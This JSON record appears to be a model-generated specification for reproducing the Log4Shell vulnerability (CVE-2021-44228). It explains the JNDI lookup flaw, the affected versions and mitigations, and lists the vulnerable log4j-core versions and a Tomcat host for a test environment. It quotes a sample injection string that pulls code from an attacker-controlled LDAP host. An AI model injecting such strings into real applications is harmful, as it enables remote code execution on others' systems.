{
    "desc": "CVE-2021-44228, widely known as \u201cLog4Shell,\u201d is a critical flaw in the Apache Log4j 2 logging framework that allows an attacker to achieve full, unauthenticated remote control of affected Java applications that log attacker-controlled data. The root cause is Log4j 2\u2019s message lookup and Java Naming and Directory Interface (JNDI) features: when Log4j 2 processes certain patterns in log messages or configuration (for example, strings like ${jndi:ldap://attacker-server/...}), the JNDI lookup can contact attacker-controlled services such as Lightweight Directory Access Protocol or Remote Method Invocation endpoints and then resolve references that lead the Java Virtual Machine to load and execute attacker-provided classes. If a vulnerable application logs user input (commonly from HTTP request headers like User-Agent, X-Forwarded-For, or Referrer, or from form fields or URLs), and the host can initiate outbound connections to the attacker\u2019s infrastructure, the attacker can coerce the application into fetching and running arbitrary code. This vulnerability impacts the Log4j 2 core component and does not affect Log4j 1.x or other Apache Logging Services projects like log4net or log4cxx. According to the National Vulnerability Database, the vulnerable window spans Apache Log4j 2 core versions 2.0-beta9 through 2.12.1 and 2.13.0 through 2.15.0, with specific security backports (2.12.2, 2.12.3, and 2.3.1) not vulnerable; release candidate 2.15.0-rc1 is also vulnerable as documented by independent analyses. In Log4j 2.15.0, dangerous behavior was disabled by default but was subsequently found incomplete (addressed in a later CVE); Log4j 2.16.0 (and backports 2.12.2/2.12.3/2.3.1) removed the vulnerable functionality. Successful exploitation typically requires only that attacker-controlled data be logged by a vulnerable Log4j 2 core and that the system can reach attacker-controlled naming/directory endpoints; no authentication is needed. Mitigation guidance from multiple vendors recommends upgrading to a safe Log4j 2 release (2.17.1+ for Java 8+, or appropriate maintained backports), or temporarily removing the JndiLookup class from log4j-core and disabling lookups, along with network egress controls to block outbound LDAP/RMI where feasible.",
    "attack_type": "Unauthenticated remote code execution via injection of attacker-controlled data into application logs that triggers Java Naming and Directory Interface lookups and arbitrary code loading",
    "services": [
        {
            "name": "log4j-core",
            "version": [
                "2.0-beta9---2.12.1",
                "2.13.0---2.15.0",
                "2.15.0-rc1"
            ],
            "dependency_type": "HARD",
            "description": "Apache Log4j 2 core library embedded in the Java application. These versions are vulnerable per the National Vulnerability Database; the presence of a vulnerable log4j-core is essential for the system to be susceptible to CVE-2021-44228."
        },
        {
            "name": "tomcat",
            "version": [
                "9.0-jdk11-temurin"
            ],
            "dependency_type": "SOFT-WEB",
            "description": "Java web container to host a testable web application that uses log4j-core and logs user-controlled input. Tomcat itself is not vulnerable to CVE-2021-44228, but it provides the minimal web runtime and HTTP surface needed so that attacker-controlled data can be logged by the vulnerable library."
        }
    ],
    "input_tokens": 15463,
    "output_tokens": 6061
}